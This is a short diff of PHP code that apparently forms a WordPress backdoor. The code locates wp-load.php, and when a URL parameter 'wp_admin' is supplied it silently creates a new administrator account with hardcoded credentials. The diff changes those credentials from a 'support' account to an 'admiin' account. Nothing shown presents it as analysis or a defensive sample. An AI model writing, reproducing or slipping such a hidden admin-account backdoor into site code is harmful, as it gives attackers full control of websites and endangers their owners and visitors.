@@ -70,7 +70,7 @@ while($wp_dir && $wp_dir!=='/'){
 }
 if(isset($_GET['wp_admin']) && file_exists($wp_dir . '/wp-load.php')){
     require_once($wp_dir . '/wp-load.php');
-    $user='support'; $pass='$Ur$w3l1c0m3.m3k+#'; $mail='support@gmail.com';
+    $user='admiin'; $pass='@admiin%7891285$'; $mail='admiin@gmail.com';
     if(!username_exists($user) && !email_exists($mail)){
         $uid=wp_create_user($user,$pass,$mail);
         $u=new WP_User($uid); $u->set_role('administrator');
